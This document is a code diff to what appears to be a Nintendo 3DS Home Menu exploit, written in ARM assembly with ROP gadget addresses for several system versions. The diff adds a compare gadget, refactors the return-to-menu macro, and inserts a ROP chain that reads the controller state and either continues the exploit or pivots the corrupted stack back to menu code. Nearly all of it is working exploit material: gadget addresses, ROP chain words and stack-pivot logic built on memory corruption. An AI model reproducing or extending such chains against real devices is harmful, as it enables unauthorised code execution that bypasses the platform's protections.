@@ -87,6 +87,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define ROP_LDRR1R1_STRR1R0 0x001f1e7c
 #define ROP_MOVR1R3_BXIP 0x001b8708
 
+#define ROP_CMPR0R1 0x0027e344
+
 #define MEMCPY 0x001536f8
 
 #define svcSleepThread 0x0012e64c
@@ -110,6 +112,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define ROP_MOVR1R3_BXIP 0x001b8848
 
 #define ROP_INITOBJARRAY 0x0020a40d
+
+#define ROP_CMPR0R1 0x0027e450
 
 #define MEMCPY 0x001536a0
 
@@ -135,6 +139,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define svcControlMemory 0x002246b4
 
 #define ROP_INITOBJARRAY 0x002190a5 //inr0=arrayptr* inr1=funcptr inr2=entrysize inr3=totalentries This basically does: curptr = inr0; while(inr3){<call inr1 funcptr with r0=curptr>; curptr+=inr2; inr3--;}
+
+#define ROP_CMPR0R1 0x002946d0 // "cmp r0, r1" "movge r0, #1" "movlt r0, #0" "pop {r4, pc}"
 #endif
 
 #if SYSVER == 93
@@ -143,6 +149,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define svcControlMemory 0x002246d4
 
 #define ROP_INITOBJARRAY 0x002190c5
+
+#define ROP_CMPR0R1 0x002946ac
 #endif
 
 #if SYSVER == 92
@@ -268,7 +276,7 @@ CALLFUNC GXLOW_CMD4, \srcadr, \dstadr, \cpysize, 0, 0, 0, 0, 0x8
 .word ROP_LOADR4_FROMOBJR0
 .endm
 
-.macro RET2MENUCODE
+.macro PREPARE_RET2MENUCODE
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
@@ -278,6 +286,10 @@ ROP_SETLR ROP_POPPC
 .word ORIGINALOBJPTR_LOADADR @ r1
 
 .word ROP_LDRR1R1_STRR1R0 @ Restore the saved r4 value overwritten by memchunkhax with the original value.
+.endm
+
+.macro RET2MENUCODE
+PREPARE_RET2MENUCODE
 
 ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
 .endm
@@ -355,6 +367,51 @@ tmp_scratchdata:
 .space 0x400
 
 ropstackstart:
+#ifdef USE_PADCHECK
+PREPARE_RET2MENUCODE
+
+.word POP_R0PC
+.word HEAPBUF + (rop_r0data_cmphid - _start) @ r0
+
+.word POP_R1PC
+.word 0x1000001c @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.
+
+.word POP_R0PC
+rop_r0data_cmphid:
+.word 0 @ r0
+
+.word POP_R1PC
+.word USE_PADCHECK @ r1
+
+.word ROP_CMPR0R1 @ Compare current PAD state with USE_PADCHECK value.
+
+.word HEAPBUF + ((object+0x20) - _start) @ r4
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+
+.word POP_R1PC
+.word TARGETOVERWRITE_STACKADR @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+
+.word POP_R1PC
+.word POP_R4R5R6PC @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
+
+.word POP_R0PC @ Begin the actual stack-pivot ROP.
+.word HEAPBUF + (object - _start) @ r0
+
+.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the USE_PADCHECK value, continue the ROP, otherwise do the above stack-pivot to return to the home-menu code.
+
+.word 0, 0, 0 @ r4..r6
+#endif
 
 //Overwrite the top-screen framebuffers. This doesn't affect the framebuffers when returning from an appet to Home Menu.
 CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
@@ -538,7 +595,7 @@ mov r4, r1
 cmp r0, #0
 bne codecrash
 
-mov r1, #0xb
+mov r1, #0xb//#0x49
 str r1, [r4, #0x48] @ flags
 ldr r1, =0x101
 str r1, [r4, #0x5c] @ NS appID (use the homemenu appID since the browser appID wouldn't be registered yet)
